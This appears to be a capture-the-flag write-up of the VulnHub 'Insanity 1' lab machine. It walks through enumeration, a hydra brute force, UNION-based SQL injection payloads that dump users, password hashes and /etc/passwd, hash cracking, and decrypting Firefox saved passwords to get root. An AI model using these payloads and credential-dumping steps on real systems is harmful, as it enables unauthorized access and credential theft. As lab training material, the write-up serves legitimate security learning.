---

title: VulnHub - Insanity 1
layout: post
date: 2020-09-23 21:05:00 +0800

---

![4866318dc0f514c3d846be4c2bea1764.png](/images/vh-insanity1/75ca3ce656c44b8d9fac809667f92924.png)

### 0. Preface

This box nearly drove me insane with the amount of rabbit holes. It helps not to overthink. The write-up may seem simple on the surface, but in reality I spent over 3 days on this. 

This is not a very difficult box when you boil it down to the techniques used, however. 

In this box, we will be tackling: 

1. Discovering a weird SQL injection method.
2. Going nuts with rabbit holes.
3. Dumping Firefox saved passwords. 

<!--excerpt-->

---

### 1. Preliminary NMAP Scan

```bash
sudo nmap -sC -sV -oN nmap.txt 192.168.32.19 -v
```

![0d3a3c8cb4ac99e9b68751a4e5689303.png](/images/vh-insanity1/866bcc7abe7843fb8b813ff308b899fe.png)

This box seems to be running CentOS, with a web server running Apache on port 80. Anonymous FTP also seems to be allowed. 

### 2. Web Server Enumeration

Let's first check out anonymous ftp. 

![4a423f66d2ed06228ab229f922b0e572.png](/images/vh-insanity1/14beff111a07406d9d9b8d62f1ffe034.png)

There's nothing to see here, so let's move on to the web server. 

![9af6ef19a0248a8adf6d0db2cc92e1a9.png](/images/vh-insanity1/2954e4e86ec041ee9ed5a7136a90f1e5.png)

Let's take a look at the page source. 

![86d62437a69f9e4cd02d8f24e2041fcc.png](/images/vh-insanity1/d6cfb879a397463185a6c860ef2ee5e8.png)

Seems like the main page is a static html page. Poking around a bit more, we end up at this login page at `/monitoring`.

![ac3dc2fee64d0752298c5d6f323944e8.png](/images/vh-insanity1/9558a9d50e804ac6ad415c829089e878.png)

Let's use `gobuster` to bruteforce both the main page and `/monitoring`, with `.php` and `.html` extensions. 

```bash
gobuster dir -u http://192.168.32.19 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -o gobuster.txt
```

![f3b9fd9a3a0496e74729f3b218c04dc4.png](/images/vh-insanity1/7bacdd1956ed4cf9909ccdf516aa9e52.png)

```bash
gobuster dir -u http://192.168.32.19/monitoring/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -o gobuster-monitoring.txt
```

![ea80f4d2bfbade41f3ffd0cd2016a68b.png](/images/vh-insanity1/2cc5e7cb25734b2bb68a080ea8fe86fa.png)

We see a couple of interesting directories. Let's start by checking out `/news`. 

![970f1e67cfacb05b3de8ae86399d7b9a.png](/images/vh-insanity1/40253fe550064183874d9b8095b87639.png)

The hostname of this seems to be `insanityhosting.vm`. Let's add that to `/etc/hosts` before we continue. 

![5becdd2f57632b124f57112662dc99d1.png](/images/vh-insanity1/33b6c998959e43c5abb23c3bb27cc543.png)

Trying to visit `/news/welcome`, we also encounter `www.insanityhosting.vm`. We will add that to `/etc/hosts` too. 

Let's visit `/news/welcome` with the hostname this time.

![37742d465133ca68d48de7b1704b52cf.png](/images/vh-insanity1/927a55ac795643d58d60afc09d0eeafe.png)

We notice the name "Otis" in the welcome message, which might be a potential username. Looking at the bottom of the page, we see that this also seems to be running [Bludit CMS](https://www.bludit.com/).

After manually fuzzing the subdirectories for `/news` a bit, we manage to find `/news/admin`, which is the login page for Bludit.

![f9e91823fb38aee9de195d7ae7286ba5.png](/images/vh-insanity1/5b574376682c4444961f6a97c4fd36a9.png)

There's nothing much we can do over here, so let's move on to `/data`. 

![ede10910f8718629d94884beccacf070.png](/images/vh-insanity1/814fb19e04f34031b83459cdd2d7b8ee.png)

![aae1966161a9d2de7e46ae9791af96ea.png](/images/vh-insanity1/f57308d256ab4686a64da4ef17786d27.png)

This directory contains two files which have the same content - `1.14.0`.

Moving on to `/webmail`. 

![a386cf4ff0fe21639efa848a8b225cef.png](/images/vh-insanity1/d42af31429fd4e92916f2799874896fd.png)

This seems to be running [SquirrelMail](squirrelmail.org) 1.4.22. Let's try to bruteforce this login with `hydra`, using the username `otis` which we saw earlier in `/news/welcome`. 

```bash
hydra -l otis -P /usr/share/wordlists/rockyou.txt "http-post-form://www.insanityhosting.vm/webmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."
```

![4836c17af51f8d4dc98447b9d0d4df78.png](/images/vh-insanity1/3a637fef799f429997bb6f09bbf86a96.png)

We got our first set of credentials - `otis:123456`. Let's login to `/webmail`. 

![ff8b31c867b8048c754d6715244ec5be.png](/images/vh-insanity1/9d41def851464f938b9264c8ec091356.png)

There's no mail in here, unfortunately. Let's go back to `/monitoring`, and try to login with the same username and password.  

![a9c39a4c80ebdeb602f1d2c1af0694d9.png](/images/vh-insanity1/54d8989985ab47aa9f9816a76c511f75.png)

Sweet. Since this is a monitoring page, let's try to add a new host with our IP address and see if it pings back to our local machine using `wireshark`. 

![245cfe023bc9b68b85b1f17bab84cc06.png](/images/vh-insanity1/8b49ab17ceaf47f087bd650aa5b8dbfc.png)

After a while, we see that the server pings us.

![801380bb8cfb883d42c8447a65e92053.png](/images/vh-insanity1/b2970de328fc46948b2d6d02c1fadca1.png)

Let's refresh the monitoring page.

![515e9f64fe7dcee824bb8da232d00100.png](/images/vh-insanity1/8f00787b55494ffbacd4287caf1b32a2.png)

We see that the status is "UP" for our local machine. Now let's try disabling the monitoring by changing the monitored IP address to an invalid IP address. This is to see if `otis` actually receives any monitoring failure email. 

![33be7b9f32a90b6735d8cfd73debe2e2.png](/images/vh-insanity1/81aa1e69a12a45d7aa0bde2d761b3751.png)

Back to `/webmail`. 

![916a8bff4f08a00d523af570b61a7beb.png](/images/vh-insanity1/f5bc5548b8274917b43550e9e11fec17.png)

Nice, the server sent an email to `otis`. Now to figure out how we can exploit this. 

### 3. SQL Injection

After quite a while of experimenting, we found that inputting `test"` in the name field results in no emails being sent to `otis`. This suggests that the monitoring website may be using an SQL based query to find out which servers are down, and using that, send an email to us. 

So with that assumption in mind, we try `test" or 1='1' -- -` in the name field. 

![20d0061150b8cf358a20a7e439ad0250.png](/images/vh-insanity1/33cfbae5337a46c689fe9b8c23046c8a.png)

![f20ef9a9149b63ba1b4925b969699f13.png](/images/vh-insanity1/58c214d935c74f5a805b05c6329671ea.png)

Awesome, everything in the database table comes back to us including the success records, which means we got ourselves SQL injection. 

Since we see that there are four columns in the email sent to us, we can try to get the list of databases using the following query. 

```sql
a" UNION SELECT group_concat(schema_name),2,3,4 FROM information_schema.schemata -- -
```

![bdcbf0e74332136d6b1cd40d1286f47b.png](/images/vh-insanity1/11fa1739ad1d44ba883a04bd2a7d5249.png)

Let's see what's inside the `monitoring` database. 

```sql
a" UNION SELECT group_concat(table_name),2,3,4 FROM information_schema.tables where table_schema = 'monitoring' -- -
```

![5b7751d03e42bf92938f54026b9543d3.png](/images/vh-insanity1/4d3723515ca64f41851190bb72c8a5e6.png)

The `users` table seems interesting, so let's check that out. 

```sql
a" UNION SELECT group_concat(column_name),2,3,4 FROM information_schema.columns where table_name = 'users' -- -
```

![d9155f10599cd0cafac0b3a5558211df.png](/images/vh-insanity1/874f7956b44f4a219b3c60e19fd477ec.png)

```sql
a" UNION SELECT group_concat(username),group_concat(password),group_concat(email),4 FROM monitoring.users -- -
```

![5e46061f7905edbb69336a0dd366ed68.png](/images/vh-insanity1/55449ae290284ac4a472ce98a5b9b463.png)

Awesome, we got the usernames, password hashes and email addresses of the users who are eligible to access this monitoring page. Not so awesome, we didn't manage to crack those after quite a long time. 

So let's move on to reading files instead. 

```sql
a" UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4 as result -- -
```

![55d2ac2e38710883bb7b7bbb5ebdac9e.png](/images/vh-insanity1/89157db7dd3643cba648d249d45f95cd.png)

Looking at `/etc/passwd`, we see that we have four users that we might be able to move to later on - `admin`, `monitor`, `elliot` and `nicholas`. 

Let's try reading the Bludit users file next.

```sql
a" UNION SELECT LOAD_FILE('/var/www/html/news/bl-content/databases/users.php'),2,3,4 as result -- -
```

![f13615830ab799c2fa21cd63d7533516.png](/images/vh-insanity1/a176427a84f0467d950e7b81425c3d52.png)

Trying to crack the password hash for the Bludit `admin` user also brings us nowhere, so let's try to get password hashes from the `mysql.user` database instead. 

```sql
a" UNION SELECT group_concat(user),group_concat(password),group_concat(authentication_string),4 FROM mysql.user -- -
```

![99e0dd27540bb46c63d8c3b0e7540e30.png](/images/vh-insanity1/b22da5ef9775419b8a88e06d32a259e2.png)

We see an `elliot` user in the database, as well as their hashed password under the `authentication_string` column. This might be the same `elliot` we saw when reading `/etc/passwd`.  Let's try to crack it. 

```text
sudo john --wordlist:/usr/share/wordlists/rockyou.txt elliot.hash
sudo john --show elliot.hash
```

![af75963cfb1d1087894693e7a98214f5.png](/images/vh-insanity1/46c91079d582457caceb8cba5964e202.png)

Nice, we got our next set of credentials - `elliot:elliot123`. Let's try to SSH using those credentials. 

![222fe82b15ef51b664363cc4ee20ceeb.png](/images/vh-insanity1/9295d9b0166e4b39aa349481b954c14e.png)

### 4. Dumping Firefox Saved Passwords

Now, let's see what `elliot` is able to read on this box. 

```bash
find / -type f -user elliot 2>/dev/null | grep -v "/proc/" | grep -v "/sys/"
```

Looking through the list, we find an interesting file.

![9576e68e94b3cc298fa02e140cc7d26e.png](/images/vh-insanity1/d6f587111a8545df916c86341606d15f.png)

Let's take a look at it. 

![acceb0b8d2824d092620e285385cf567.png](/images/vh-insanity1/f47babed1ef743e288ae0fe384fac0fd.png)

This seems to be some credentials saved in Firefox (note the directory). After Googling a bit on ways to recover passwords from such files, we manage to find a [Github Repository](https://github.com/Unode/firefox_decrypt), which allows you dump Firefox saved login databases. 

Let's upload the python script and run it. 

![270995f9e5334c61dd9c5a3a24ca5d60.png](/images/vh-insanity1/979e2545c54a4d07a3735eb29d0208a1.png)

Great, the file is successfully decrypted without a master password. We may have the `root` credentials here - `root:S8Y389KJqWpJuSwFqFZHwfZ3GnegUa`

Let's try to `su root`. 

![07d76e6e943e508e74bcca7857e0f5d0.png](/images/vh-insanity1/84048bc2e87d42ebbec7116af09620b0.png)

And we're done. 

